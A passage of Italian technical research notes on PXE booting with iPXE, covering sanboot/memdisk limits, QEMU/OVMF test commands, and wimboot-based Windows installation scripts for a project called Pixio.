# sanboot http (src/net/tcp/httpblock.c): '#define HTTP_BLKSIZE 512'; http_block_read() fa una richiesta HTTP con 'range.start = ( lba * HTTP_BLKSIZE ); range.len = len' per ogni lettura; la capacita' si ottiene con una HEAD (Content-Length). => NON scarica l'ISO in RAM: un ISO da 5 GB e' servibile purche' il server supporti Range (nginx statico: si'; NON passare per la GUI Flask/gunicorn, e non usare gzip). Su BIOS (arch/x86/interface/pcbios/int13.c) iPXE aggancia INT 13h, espone il drive (0x80.. per HD; per ISO legge l'El Torito boot catalog e carica il boot image) e salta al boot sector; su EFI (interface/efi/efi_block.c) installa EFI_BLOCK_IO_PROTOCOL e cerca '\EFI\BOOT\BOOTX64.EFI' (o --filename) sul filesystem che il firmware riconosce (serve ISO con El Torito UEFI / partizione FAT EFI, cioe' ISO 'hybrid' moderne).
# LIMITE FONDAMENTALE: int13.c: 'Once an operating system switches to protected-mode drivers, the drive becomes inaccessible'; efi_block.c: 'device disappears after ExitBootServices'. Il 'describe' (iBFT/aBFT) informa l'OS solo per iSCSI/AoE/FCoE: per HTTP non esiste una tabella -> l'OS non puo' riconnettersi.
#  -> Windows ISO via sanboot: bootmgr/WinPE parte (BIOS e UEFI) ma Setup non trova sources/install.wim/i driver: NON funziona ne' in BIOS ne' in UEFI (FOG forum: 'the only way... custom winpe environment via pxe that connects to a network share'; ipxe discussions #962: 'as soon as the OS boots, the references to the existence of a CD is totally gone'). Ricetta corretta: wimboot + share SMB (come nella spec).
#  -> Linux ISO via sanboot: funziona solo se l'initrd sa ripescare l'immagine dalla rete (es. Ubuntu casper 'netboot=url url=', Debian live 'fetch=', Fedora 'root=live:http://', Arch 'archiso_http_srv=') -> tanto vale usare kernel+initrd, che e' anche piu' veloce.
#  -> Casi dove sanboot http funziona da solo: ISO 'tutto in RAM' con boot BIOS che non rilegge il CD (FreeDOS fdfullcd.iso esempio ufficiale, alcuni tool DOS, memtest ISO), oppure boot del disco locale: sanboot --no-describe --drive 0x80.
# memdisk (syslinux wiki): 'MEMDISK simulates a disk by claiming a chunk of high memory for the disk ... hooking the INT 13h and INT 15h'. SOLO BIOS (mai su UEFI: iPXE EFI non carica binari PXE/COMBOOT, errore 2e008081). L'ISO va INTERAMENTE in RAM (immagine da 5 GB = impossibile su client con poca RAM; iPXE stesso deve scaricarla tutta prima del boot). 'The majority of Linux-based ISO images will also fail to work with MEMDISK ISO emulation' (workaround findiso=, phram); Windows NT+: 'once the protected mode drivers are functional... Windows can't see the memory-mapped drives created by MEMDISK' (servono driver WinVBlock/Firadisk). Sintassi: kernel http://srv/pxe/boot/memdisk iso raw ; initrd http://srv/pxe/isofile/<slug>.iso ; boot  (opzione 'iso' = El Torito drive 0xE0, 'raw' = accesso raw alla memoria protetta, consigliato per compatibilita').
# Raccomandazione per la GUI: 'Generico' -> BIOS: memdisk solo se ISO < ~50% RAM client, altrimenti sanboot; UEFI: sanboot con avviso 'funziona solo per ISO EFI-bootable che non rileggono il supporto'; Windows sempre wimboot.
```

### 7. Comandi QEMU di test verificati (TCG, senza KVM) e gotcha OVMF

*Fonte:* Test eseguiti (scratchpad/test/*.log); /usr/share/doc/ovmf/NEWS.Debian.gz; /usr/share/doc/ovmf/README.Debian — *confidenza:* alta

```
# Server HTTP di prova sull'host (raggiungibile dal guest come 10.0.2.2): python3 -m http.server 8000 --bind 127.0.0.1
# BIOS (ok, ~30 s in TCG):
qemu-system-x86_64 -m 512 -display none -serial file:bios.log \
  -netdev user,id=n0,tftp=/srv/pixio/tftp,bootfile=undionly.kpxe -device e1000,netdev=n0 -boot n -no-reboot
# UEFI (ok solo con virtio-rng-pci e bootindex sulla NIC; e1000 senza bootindex e senza rng -> OVMF va in EFI Shell senza tentare PXE):
cp /usr/share/OVMF/OVMF_VARS_4M.fd vars.fd
qemu-system-x86_64 -m 1024 -display none -serial file:uefi.log \
  -drive if=pflash,format=raw,readonly=on,file=/usr/share/OVMF/OVMF_CODE_4M.fd -drive if=pflash,format=raw,file=vars.fd \
  -device virtio-rng-pci -netdev user,id=n0,tftp=/srv/pixio/tftp,bootfile=ipxe.efi -device virtio-net-pci,netdev=n0,bootindex=0 -no-reboot
# /usr/share/doc/ovmf/NEWS.Debian.gz (edk2 2025.02-1): 'For security reasons, network boot options are no longer usable in guests that lack a random number generator. You can add a random number generator to QEMU guests with -device virtio-rng-pci'.
# Log OVMF atteso: '>>Start PXE over IPv4.' -> 'BdsDxe: starting Boot0001 "UEFI PXEv4 (MAC:...)"' -> 'iPXE initialising devices...' -> banner iPXE.
# Con CONSOLE_SERIAL compilato l'output iPXE va anche sulla seriale (su UEFI i caratteri risultano DOPPI nel file perche' OVMF inoltra anche la console EFI sulla stessa seriale: normale). QEMU user-net: DHCP -> ip 10.0.2.15, next-server 10.0.2.2, filename = bootfile.
# Alternativa per testare ipxe.efi senza PXE: -drive format=raw,file=fat:rw:<dir> con startup.nsh contenente 'fs0:\ipxe.efi' (la EFI Shell di OVMF_CODE_4M.fd lo esegue dopo 5 s).
```

### 8. Variabili/settings utili nei menu (nomi verificati nel sorgente)

*Fonte:* src/core/settings.c; src/interface/smbios/smbios_settings.c; https://ipxe.org/cfg/platform; https://ipxe.org/cfg/buildarch; https://ipxe.org/cfg/mac; https://ipxe.org/cmd/set; output reale dei test QEMU — *confidenza:* alta

```
${platform}   builtin: pcbios | efi | linux
${buildarch}  builtin: i386 | x86_64 | arm32 | arm64 (arch di compilazione, NON della CPU)
${version}    builtin (es. '2.0.0+ (gff6e5)'); ${unixtime}; ${cwuri} (URI dello script corrente)
${net0/mac}   'net0/mac:hex = 52:54:00:12:34:56'; ${net0/mac:hexhyp} -> 52-54-00-12-34-56 ; ${mac} equivale alla NIC corrente
${net0/ip} / ${ip}, ${netmask}, ${gateway}, ${dns}, ${hostname} (DHCP opt 12), ${domain}, ${filename} (opt 67), ${next-server} (siaddr), ${root-path}, ${user-class}
${manufacturer}, ${product}, ${serial}, ${asset}, ${board-serial}, ${uuid}  (scope smbios: anche ${smbios/manufacturer})
# Tipi: ${var:string} ${var:hex} ${var:ipv4} ${var:uuid}; 'set esc:hex 1b' + 'set cls ${esc:string}\[2J' per sequenze ANSI.
# Esempio parametri verso boot.ipxe dinamico:
chain http://${next-server}/boot.ipxe?platform=${platform}&buildarch=${buildarch}&mac=${net0/mac:hexhyp}&ip=${net0/ip}&uuid=${uuid}&manufacturer=${manufacturer:uristring}&product=${product:uristring}
# (:uristring = URL-encode; con NET_PROTO_IPV6 e' possibile che ${net0/ip} sia vuoto se solo IPv6: usare isset).
```

### Trappole

- I target make hanno nomi fissi: 'make bin/undionly-test.kpxe' fallisce con 'undefined symbol obj_ipxe_test'. Per varianti con script embedded diversi, ricompilare lo stesso target (make ricompila solo embedded.o quando EMBED cambia, tramite bin/.embedded.list) e copiare via il binario, oppure usare CONFIG=<nome> che produce bin-<arch>-<platform>-<nome>/.
- Il path in EMBED= deve essere assoluto o relativo a src/; il file embedded viene letto a build time (non a runtime).
- Con script embedded sparisce il prompt 'Press Ctrl-B'; aggiungere 'prompt --key 0x02 --timeout 2000 ... && shell ||' se si vuole accesso alla shell.
- ${buildarch} di undionly.kpxe e' sempre 'i386' anche su CPU 64 bit: per scegliere kernel/wimboot amd64 usare 'cpuid --ext 29 && set arch x86_64 || set arch i386' (BIOS) o ${buildarch} su EFI (x86_64 vs i386 per bin-i386-efi/ipxe.efi).
- Il separatore ';' NON esiste negli script iPXE (core/exec.c riconosce solo '||' e '&&'): un comando per riga.
- 'goto' fallisce se la label non esiste: 'goto ${selected} || goto unknown'; 'choose' fallisce su Esc/Ctrl-C: 'choose ... selected || goto cancel'. 'sleep' fallisce se interrotto con Ctrl-C: usare 'sleep 3 ||' nei loop di retry se non si vuole uscire.
- config/general.h fa #undef DOWNLOAD_PROTO_HTTPS, CONSOLE_CMD, VLAN_CMD, NTP_CMD, PARAM_CMD, PCI_CMD, CERT_CMD su pcbios e console.h fa #undef CONSOLE_FRAMEBUFFER su pcbios: i #define in config/local/*.h vengono inclusi DOPO e quindi riabilitano tutto (verificato: banner BIOS mostra HTTPS). Non modificare config/general.h con sed: config/local/ e' il meccanismo ufficiale, ignorato da git.
- Il pacchetto Debian ipxe NON contiene bin-i386-efi/ipxe.efi (UEFI ia32) e nessuno script embedded; ipxe-qemu efi-*.rom non contengono piu' lo stack iPXE (dal 2025-04). Con i binari Debian il rilevamento user-class 'iPXE' in dnsmasq e' obbligatorio per evitare il boot loop.
- OVMF Debian (edk2 2025.02) non crea boot option PXE senza '-device virtio-rng-pci' (NEWS.Debian): senza, il guest finisce nella EFI Shell senza alcun tentativo di rete. Aggiungere anche bootindex=0 sulla NIC (con -boot n solamente OVMF parte dalla EFI Shell). Con e1000 senza questi accorgimenti il test UEFI e' fallito; con virtio-net-pci + virtio-rng-pci + bootindex=0 ha funzionato.
- Su UEFI con CONSOLE_SERIAL l'output nel file seriale appare con caratteri raddoppiati (console EFI + console seriale iPXE sulla stessa porta): e' cosmetico.
- ipxe.efi cerca 'autoexec.ipxe' nella directory TFTP/HTTP da cui e' stato caricato ('autoexec.ipxe... Not found (https://ipxe.org/2d12618e)'): puo' sostituire lo script embedded per UEFI, ma non per undionly.kpxe.
- sanboot http richiede HTTP Range e Content-Length: servire le ISO da nginx statico (mai dal proxy Flask/gunicorn, senza gzip). Non carica l'ISO in RAM ma il disco virtuale sparisce quando l'OS carica i propri driver: Windows Setup da ISO via sanboot non funziona ne' in BIOS ne' in UEFI; usare wimboot + share SMB.
- memdisk: solo BIOS, ISO intera in RAM (limite pratico = RAM client; l'ISO deve essere scaricata tutta da iPXE prima del boot), la maggior parte delle ISO Linux moderne e tutte le Windows falliscono dopo il boot del kernel.
- wimboot non e' pacchettizzato in Debian: scaricare https://github.com/ipxe/wimboot/releases/latest/download/wimboot (unico binario BIOS+UEFI x64). wimboot estrae da solo bootmgr/bootmgfw.efi e BCD dal boot.wim; i file iniettati con 'initrd file nome' finiscono in X:\Windows\System32 (winpeshl.ini -> [LaunchApps] "install.cmd").
- Per kernel Linux < 5.7 su UEFI serve 'initrd=initrd.magic' nella cmdline; sui kernel moderni non serve (LoadFile2/LINUX_EFI_INITRD_MEDIA_GUID) ma e' innocuo: aggiungerlo sempre nelle ricette e' la scelta piu' robusta.
- iPXE master e' ora versione 2.0.0+ (tag v2.0.0 del 6 marzo 2026; supporto Secure Boot via shim dedicato, RISC-V, LoongArch): documentazione ipxe.org in parte non aggiornata (pagine cfg:next-server, cfg:hostname, cfg:ip, cfg:manufacturer, howto:memdisk non esistono).
- Alcuni test hanno evidenziato che 'imgstat' dentro uno script chainato non ha stampato nulla (probabilmente output redirezionato/ottimizzato): non affidarsi a imgstat per logica di script.

### Domande aperte

- ${next-server} in scenario proxyDHCP con dnsmasq reale non testato qui (QEMU user-net non fa proxyDHCP): dal codice (net/udp/dhcp.c dhcp_has_pxeopts) l'offerta proxy viene registrata come blocco 'proxydhcp' solo se contiene siaddr != 0 E option 67 (o PXE boot menu). dnsmasq in modalita' proxy con dhcp-boot=... mette siaddr = proprio IP, quindi dovrebbe funzionare, ma il fallback fisso su 10.10.0.254 nello script embedded resta necessario (confidenza media). Da verificare con dnsmasq --test + client reale/QEMU su bridge.
- Non verificato se snponly.efi in QEMU/OVMF funzioni senza driver SNP attivo (in questo test si e' usato ipxe.efi con driver nativo virtio); su hardware reale snponly.efi e' spesso piu' compatibile di ipxe.efi con NIC senza driver iPXE nativo: la GUI dovrebbe permettere di scegliere quale servire.
- Priorita' tra settings 'dhcp' e 'proxydhcp' quando entrambi contengono filename/next-server: non analizzata in dettaglio (settings registrati come blocchi globali con priorita' da DHCP_EB_PRIORITY); rilevante solo se il DHCP LAN esistente (10.10.0.1) invia gia' un filename/next-server.
- sanboot http di ISO Linux 'hybrid' in UEFI (OVMF) non testato in questa sessione: efi_block.c non contiene gestione El Torito propria, si affida al firmware (PartitionDxe/FAT); comportamento dipendente dal firmware del client (confidenza media).
- Non testato 'console --picture' con PNG reale (richiede CONSOLE_FRAMEBUFFER + IMAGE_PNG, compilati nella build): verificare che il PNG sia in formato supportato (PNG 8-bit RGB/RGBA senza interlace e' la scelta sicura) su hardware con VESA/GOP.
- apt stava installando in background: il pacchetto 'ipxe' risultava gia' installato (1.21.1+git20250501.dad20602+dfsg-1) ma non e' stato controllato se altri pacchetti previsti (dnsmasq, nginx, cifs-utils) fossero gia' completati.

## Installazione Windows 10/11/Server via PXE con iPXE + wimboot (ISO in loop, HTTP nginx, share Samba locale) + WinPE tool (Hiren's, Medicat, Strelec) + rilevamento/wiminfo

wimboot: un unico binario ibrido "wimboot" (BIOS + UEFI x64, anche Secure Boot) da https://github.com/ipxe/wimboot/releases/latest/download/wimboot (ultima v2.9.0, 17/11/2025, necessaria per Windows 11 24H2+ perché estrae boot.stl e bootmgfw_EX.efi); "wimboot.i386" solo per UEFI 32 bit. wimboot estrae da solo dal boot.wim bootmgr.exe/bootmgfw.efi/BCD/boot.sdi, quindi lo script minimo è `kernel wimboot` + `initrd .../sources/boot.wim boot.wim`; BCD/boot.sdi dalla ISO sono opzionali. Ogni file initrd con nome non riconosciuto (winpeshl.ini, install.cmd) finisce in X:\Windows\System32. Il confronto nomi in wimboot è case-insensitive (strcasecmp/wcscasecmp), ma gli URL su nginx (loop mount Linux) sono case-sensitive: lo scanner deve trovare i file in modo case-insensitive. Indice: senza index=N wimboot usa il "Boot Index" dell'header, che nei boot.wim ufficiali è 2 = "Microsoft Windows Setup" (contiene X:\setup.exe e gli stessi driver di rete dell'index 1). SMB guest: Microsoft blocca i guest logon SMB2/3 di default su Win10 Ent/Edu/Pro-for-Workstations, Win11 Pro (build ≥25267) e con 24H2 richiede SMB signing (incompatibile con guest); WinPE eredita LanmanWorkstation AllowInsecureGuestAuth=0 → `net use` guest fallisce con "System error 1272 ... block unauthenticated guest access". Soluzione affidabile: utente Samba dedicato (es. pxe/pxe) e `net use S: \\10.10.0.254\pxe pxe /user:pxe`; con utente autenticato NTLMv2 + signing SMB2 funzionano con Samba 4.22 (Debian 13 default: server min protocol SMB2_02, ntlm auth ntlmv2-only, map to guest Bad User). setup.exe lanciato da S:\<slug>\setup.exe della ISO montata trova sources\install.wim/esd: è esattamente il metodo documentato da ipxe.org; caveat: modalità firmware (UEFI→GPT, BIOS→MBR), RAM (boot.wim tutto in RAM), secondo boot da disco, TPM bypass via HKLM\SYSTEM\Setup\LabConfig (non ufficiale). Hiren's PE: tutto dentro sources/boot.wim → wimboot funziona al 100%; Strelec: cartella SSTR/ con strelec*.wim + BCD + boot.sdi ma programmi esterni al wim → funzionalità parziale; Medicat: non è una ISO singola (USB Ventoy), il Mini Windows ISO/WIM ha i programmi fuori dal wim → PE nudo. Rilevamento: installer = sources/install.wim|install.esd|install*.swm + sources/boot.wim + bootmgr/efi; WinPE tool = bootmgr + un .wim senza install.*. wiminfo (wimtools 1.14.4 installato): `wiminfo file.wim` testo, `wiminfo file.wim --xml` = XML UTF-16LE (con BOM) da decodificare e parsare: IMAGE@INDEX, NAME, DISPLAYNAME, FLAGS, WINDOWS/ARCH (9=x86_64, 0=x86, 12=ARM64), WINDOWS/EDITIONID, WINDOWS/INSTALLATIONTYPE, WINDOWS/PRODUCTNAME, WINDOWS/VERSION/MAJOR|MINOR|BUILD.

### 1a. Download wimboot: binario unico BIOS+UEFI x64, varianti, versione

*Fonte:* https://ipxe.org/wimboot ; https://github.com/ipxe/wimboot/releases/latest — *confidenza:* alta

```
ipxe.org/wimboot (verbatim):
"You can download the latest version of the wimboot binary from https://github.com/ipxe/wimboot/releases/latest/download/wimboot. This is a hybrid binary that will work on both BIOS and 64-bit UEFI systems (including UEFI systems with Secure Boot enabled).
You can also download alternative binaries (e.g. for 32-bit UEFI systems) from https://github.com/ipxe/wimboot/releases/latest."

Release GitHub più recente: v2.9.0 (17 nov 2025). Asset:
  wimboot          -> BIOS + UEFI x86_64 (nome file SENZA estensione; NON esiste 'wimboot.x86_64.efi' tra gli asset di release)
  wimboot.i386     -> BIOS + UEFI 32 bit
  wimboot.arm64    -> UEFI AArch64
  wimboot-2.9.0.zip / .tar.gz -> sorgenti
URL versionato: https://github.com/ipxe/wimboot/releases/download/v2.9.0/wimboot
Note di release 2.9.0: "Automatic extraction of the boot.stl file from .wim images to support Windows 11 24H2+"; "Support for bootmgfw_EX.efi bootloader selection on systems with 'Windows UEFI CA 2023' certificate trust". => per ISO Windows 11 24H2/25H2 e Server 2025 serve wimboot >= 2.9.0 (il pacchetto Debian 'ipxe' NON contiene wimboot: scaricarlo in /srv/pixio/http/boot/wimboot).
Licenza: GPLv2.
```

### 1b. Script iPXE ufficiali (ipxe.org) per wimboot / WinPE / install da share

*Fonte:* https://ipxe.org/wimboot ; https://ipxe.org/howto/winpe ; https://ipxe.org/cmd/initrd — *confidenza:* alta

```
ipxe.org/wimboot - script minimo (il resto viene estratto dal wim):
  #!ipxe

  kernel wimboot
  initrd sources/boot.wim boot.wim
  boot

ipxe.org/wimboot - file iniettati:
"You can provide additional files to wimboot. These files will appear within the X:\Windows\System32 directory. For example:
  kernel wimboot
  initrd winpeshl.ini     winpeshl.ini
  initrd startup.bat      startup.bat
  initrd sources/boot.wim boot.wim
  boot"
"You can disable this behaviour by using the rawwim command-line option."

ipxe.org/wimboot - indice multi-immagine: "You can use the index=<N> command-line option to select the image to be booted. For example:
  kernel wimboot index=2"

ipxe.org/wimboot - boot manager custom: "wimboot will attempt to extract an appropriate boot manager (such as bootmgr, bootmgr.exe or bootmgfw.efi) from the WIM file, along with the boot configuration data (BCD)."
Opzioni: quiet (no debug), rawbcd (non patchare .exe->.efi nel BCD), gui, linear (no paging >4GB), pause (attesa tasto). Troubleshooting: imgstat + prompt prima di boot.

ipxe.org/howto/winpe - script completo con batch di avvio (verbatim):
  #!ipxe

  cpuid --ext 29 && set arch amd64 || set arch x86
  kernel wimboot
  initrd install.bat                                install.bat
  initrd winpeshl.ini                               winpeshl.ini
  initrd ${arch}/media/Boot/BCD                     BCD
  initrd ${arch}/media/Boot/boot.sdi                boot.sdi
  initrd ${arch}/media/sources/boot.wim             boot.wim
  boot

ipxe.org/howto/winpe - install.bat e winpeshl.ini (verbatim):
  wpeinit
  net use \\myserver\installers
  \\myserver\installers\win8\setup.exe

  [LaunchApps]
  "install.bat"
"You can now connect to a Windows (or Samba) file server to run the Windows installer. For example, if you have copied the contents of your Windows installation DVD-ROM to \\myserver\installers\win8, then you can start the installer using: net use \\myserver\installers ; \\myserver\installers\win8\setup.exe"

Sintassi initrd (ipxe.org/cmd/initrd): "initrd [--name <name>] [--timeout <timeout>] <uri> [<arguments>...]" - "Any argument supplied to the initrd command will be used as the pathname for that image within the initrd.magic" => il secondo token (es. 'boot.wim') è il nome con cui wimboot vede il file; --name/-n imposta il nome immagine iPXE (usato come fallback e da imgfree). La forma `initrd -n boot.wim URL boot.wim` (usata da ipxe.org per AIK) copre entrambi.
```

### 1c. Cosa wimboot estrae da solo dal .wim e come confronta i nomi (sorgente)

*Fonte:* https://raw.githubusercontent.com/ipxe/wimboot/master/src/efifile.c ; .../src/main.c ; .../src/wim.c — *confidenza:* alta

```
src/efifile.c (UEFI):
  static const wchar_t bootmgfw_path[] = L"\\Windows\\Boot\\EFI\\bootmgfw.efi";
  static const wchar_t bootmgfw_ex_path[] = L"\\Windows\\Boot\\EFI_EX\\bootmgfw_EX.efi";
  ... L"\\Windows\\Boot\\DVD\\EFI\\boot.sdi", L"\\Windows\\Boot\\DVD\\EFI\\BCD", L"\\Windows\\Boot\\EFI\\boot.stl", fonts (segmono_boot.ttf, segoen_slboot.ttf, segoe_slboot.ttf, wgl4_boot.ttf), L"\\sms\\boot\\boot.sdi"
  riconoscimento file passati via initrd: wcscasecmp(wname, L"bootmgfw.efi"), L"bootmgfw_EX.efi", L"BCD" (-> vdisk_patch_file(efi_patch_bcd): sostituisce ".exe" con ".efi" salvo rawbcd)
src/main.c (BIOS):
  riconosce per nome con strcasecmp: "bootmgr.exe", "bootmgr", e i file con estensione ".wim"
  estrae dal wim: L"\\Windows\\Boot\\PXE\\bootmgr.exe", L"\\Windows\\Boot\\DVD\\PCAT\\boot.sdi", L"\\Windows\\Boot\\DVD\\PCAT\\BCD", fonts, L"\\sms\\boot\\boot.sdi"
src/wim.c (indice di default):
  /* If no image index is specified, just use the boot metadata */
  if ( index == 0 ) { memcpy ( meta, &header->boot, sizeof ( *meta ) ); return 0; }

Conclusioni pratiche:
- I nomi di destinazione (BCD, boot.sdi, boot.wim, bootmgr) NON sono case-sensitive per wimboot; ciò che conta è che il wim abbia estensione .wim e che i file non riconosciuti (winpeshl.ini, install.cmd) abbiano il nome esatto che WinPE cerca (NTFS/WinPE case-insensitive).
- Senza index= wimboot usa il Boot Index del wim: nei boot.wim ufficiali Microsoft = 2 ("Microsoft Windows Setup (x64)"). Per essere espliciti: `kernel wimboot index=2` (l'index vale anche per l'estrazione di bootmgr/BCD).
- BCD e boot.sdi dalla ISO sono opzionali (wimboot li estrae dal wim). Se li passi, usa quelli di /boot/ della ISO (BIOS-style: wimboot li patcha per UEFI).
```

### 1d. Script iPXE proposto per Pixio (Windows installer, BIOS+UEFI)

*Fonte:* Derivato da ipxe.org/wimboot + ipxe.org/howto/winpe + sorgenti wimboot — *confidenza:* alta

```
Generato dal menu per ogni <slug> di tipo windows-install (server 10.10.0.254). Percorsi HTTP: /pxe/boot/wimboot, /pxe/iso/<slug>/... (loop mount), /pxe/win/<slug>/winpeshl.ini e install.cmd generati dalla GUI (con IP/slug/credenziali):

#!ipxe
set srv 10.10.0.254
set slug ${slug}
imgfree
kernel http://${srv}/pxe/boot/wimboot quiet index=2 || goto failed
initrd http://${srv}/pxe/win/${slug}/winpeshl.ini winpeshl.ini || goto failed
initrd http://${srv}/pxe/win/${slug}/install.cmd  install.cmd  || goto failed
initrd http://${srv}/pxe/iso/${slug}/boot/bcd      BCD          ||
initrd http://${srv}/pxe/iso/${slug}/boot/boot.sdi boot.sdi     ||
initrd -n boot.wim http://${srv}/pxe/iso/${slug}/sources/boot.wim boot.wim || goto failed
boot || goto failed
:failed
echo Boot Windows fallito
prompt Premi un tasto per tornare al menu

Note:
- Le due righe bcd/boot.sdi terminano con '||' (non fatali) perché sono opzionali; i nomi reali nella ISO vanno risolti in modo case-insensitive dallo scanner e scritti nell'URL con il case reale (nginx su loop mount è case-sensitive). Nelle ISO Microsoft i nomi sono minuscoli (boot/bcd, boot/boot.sdi, sources/boot.wim, sources/install.wim, bootmgr, bootmgr.efi, efi/boot/bootx64.efi, setup.exe) [confidenza media: non verificato su una ISO reale in questa sessione; nessuna ISO Windows presente sulla macchina].
- Stesso script per BIOS (undionly.kpxe) e UEFI (ipxe.efi/snponly.efi): wimboot è ibrido. Per UEFI ia32 usare wimboot.i386.
- Secure Boot: wimboot lo supporta, ma ipxe.efi non è firmato Microsoft: la catena PXE richiede Secure Boot OFF (o shim firmato) - caveat da mostrare in GUI.
- RAM: boot.wim (≈450-900 MB per installer, 2.5-3 GB Hiren's) viene caricato tutto in RAM; wimboot usa paging sopra i 4 GB su BIOS (opzione linear la disabilita).
- nginx: nessuna direttiva speciale; assicurarsi che /pxe/ non abbia gzip e che sendfile sia on.
```

### 2a. winpeshl.ini: formato ufficiale Microsoft

*Fonte:* https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/winpeshlini-reference-launching-an-app-when-winpe-starts ; https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/wpeinit-and-startnetcmd-using-winpe-startup-scripts ; https://easy2boot.xyz/troubleshooting-e2b/wimboot-and-the-winpe-boot-process/ — *confidenza:* alta

```
MS Learn (verbatim): "To add a customized app, create a file named Winpeshl.ini and place it in %SYSTEMROOT%\System32 a customized Windows PE image."
Esempio ufficiale:
[LaunchApp]
AppPath = %SYSTEMDRIVE%\Fabrikam\shell.exe
[LaunchApps]
%SYSTEMDRIVE%\Fabrikam\app1.exe
%SYSTEMDRIVE%\Fabrikam\app2.exe, /s "C:\Program Files\App3"
"The apps listed in [LaunchApp] and [LaunchApps] run in order of appearance, and don't start until the previous app has terminated." "LaunchApps supports running apps, but does not support common scripting commands. To run commands, add a startup script instead (startnet.cmd)." "You can't specify a command that is greater than 250 characters." "To add command-line options to an app: add a comma (,) after the app name".

wpeinit (MS Learn): "Startnet.cmd starts Wpeinit.exe. Wpeinit.exe installs Plug and Play devices, processes Unattend.xml settings, and loads network resources." Log: C:\Windows\system32\wpeinit.log. Con winpeshl.ini presente, startnet.cmd NON viene eseguito (winpeshl.exe lancia le app di winpeshl.ini al posto di cmd /k startnet.cmd) -> wpeinit va chiamato dallo script. [Il fatto che startnet.cmd sia saltato quando esiste winpeshl.ini: prassi documentata dalla community/ipxe.org, non testualmente su questa pagina MS: confidenza media-alta.]

Boot process senza winpeshl.ini (Easy2Boot): "If winpeshl.ini does not exist then X:\Setup.exe is run, if it exists" -> nel boot.wim index 2 c'è X:\setup.exe che partirebbe da solo e fallirebbe senza media; il nostro winpeshl.ini iniettato in X:\Windows\System32 lo sostituisce.

winpeshl.ini per Pixio (wimboot lo mette in X:\Windows\System32, che è la cwd/PATH di winpeshl, quindi il nome relativo funziona come nell'esempio ipxe.org 'install.bat'):
[LaunchApps]
"install.cmd"

Variante più robusta (esplicita, evita dubbi su come winpeshl lancia un .cmd):
[LaunchApps]
%SYSTEMROOT%\System32\cmd.exe, /c %SYSTEMROOT%\System32\install.cmd
```

### 2b. install.cmd proposto (wpeinit, attesa rete, net use con utente, setup.exe)

*Fonte:* https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11) ; https://ipxe.org/howto/winpe — *confidenza:* alta

```
Sintassi net use (MS Learn, verbatim): "net use [{<DeviceName> | *}] [\\<ComputerName>\<ShareName>[\<volume>]] [{<Password> | *}]] [/user:[<DomainName>\]<UserName]" -> la password va DOPO lo share e PRIMA di /user:.

install.cmd (generato dalla GUI; sostituire 10.10.0.254, <slug>, utente/password):

@echo off
title Pixio - Windows Setup
wpeinit
set SRV=10.10.0.254
set SHARE=pxe
set SLUG=<slug>
set SMBUSER=pxe
set SMBPASS=pxe
set /a TRIES=0
:waitnet
ping -n 1 -w 1000 %SRV% >nul 2>&1 && goto netok
set /a TRIES+=1
if %TRIES% GEQ 60 goto neterr
echo In attesa della rete (%TRIES%)...
ping -n 3 127.0.0.1 >nul
goto waitnet
:netok
net use S: \\%SRV%\%SHARE% %SMBPASS% /user:%SMBUSER% /persistent:no
if errorlevel 1 goto smberr
if not exist S:\%SLUG%\setup.exe goto noiso
rem --- opzionale: bypass requisiti Windows 11 (vedi punto 4) ---
rem reg add HKLM\SYSTEM\Setup\LabConfig /v BypassTPMCheck /t REG_DWORD /d 1 /f
rem reg add HKLM\SYSTEM\Setup\LabConfig /v BypassSecureBootCheck /t REG_DWORD /d 1 /f
rem reg add HKLM\SYSTEM\Setup\LabConfig /v BypassRAMCheck /t REG_DWORD /d 1 /f
rem reg add HKLM\SYSTEM\Setup\LabConfig /v BypassCPUCheck /t REG_DWORD /d 1 /f
S:
S:\%SLUG%\setup.exe
goto end
:neterr
echo Rete non disponibile (manca driver NIC in WinPE?). ipconfig:
ipconfig
goto shell
:smberr
echo net use fallito (credenziali/Samba?). Riprovo tra 5 s...
ping -n 6 127.0.0.1 >nul
goto netok
:noiso
echo S:\%SLUG%\setup.exe non trovato
:shell
cmd.exe
:end

Note:
- 'timeout.exe' non è garantito in WinPE: usare 'ping -n N 127.0.0.1' come sleep. net.exe, ipconfig, reg.exe, wpeutil sono presenti in WinPE.
- Mappare una lettera (S:) e lanciare S:\<slug>\setup.exe (root della ISO montata): setup.exe della root avvia sources\setup.exe e trova sources\install.wim/install.esd relativi alla propria posizione. È esattamente il metodo ipxe.org ('\\myserver\installers\win8\setup.exe' su una copia del DVD). Lanciare via UNC funziona ma la lettera di unità è più sicura.
- Se tutte le app di [LaunchApps] terminano, winpeshl fa riavviare WinPE; per lasciare una shell in caso di errore lo script finisce con cmd.exe. Per riavvio esplicito: wpeutil reboot / wpeutil shutdown.
- Server (2019/2022/2025): stesso layout ISO (sources/boot.wim + sources/install.wim), stesso script.
- Usare l'IP e non il nome host: WinPE non ha NetBIOS/WINS configurato e DNS potrebbe non risolvere 'pixio'. NetBIOS lato Samba non serve (porta 445).
```

### 2c. boot.wim index 1 vs 2 e driver di rete

*Fonte:* https://ipxe.org/howto/winpe ; sorgente wimboot src/wim.c ; output wiminfo (wimtools 1.14.4) — *confidenza:* alta

```
boot.wim ufficiale (Win10/11/Server): index 1 = "Microsoft Windows PE (x64)", index 2 = "Microsoft Windows Setup (x64)", Boot Index = 2. L'index 2 è l'index 1 + i file di Setup (X:\setup.exe, X:\sources\*): i driver di rete (in-box) sono gli stessi in entrambi. wimboot senza index= usa il Boot Index (=2): giusto per l'installazione. Passare 'index=2' esplicito è comunque consigliabile (alcuni wim custom hanno boot index 0/1). Il layout 'Windows PE / Windows Setup' con Boot Index 2 può essere verificato con wiminfo (vedi punto 6).
Aggiunta driver NIC mancanti (ipxe.org/howto/winpe): dism /image:<mount> /add-driver /driver:<dir> /recurse su boot.wim (index 2) - con wimlib su Linux non si possono iniettare driver in modo semplice (wimupdate può aggiungere file ma non registrare i driver): opzione fuori scope, da segnalare in GUI se WinPE non vede la rete (ipconfig vuoto).
```

### 2d. Accesso guest SMB da WinPE: NON affidabile -> usare utente/password

*Fonte:* https://learn.microsoft.com/en-us/windows-server/storage/file-server/enable-insecure-guest-logons-smb2-and-smb3 ; https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-workstationservice-allowinsecureguestauth ; man smb.conf (samba 4.22.10 Debian 13) — *confidenza:* alta

```
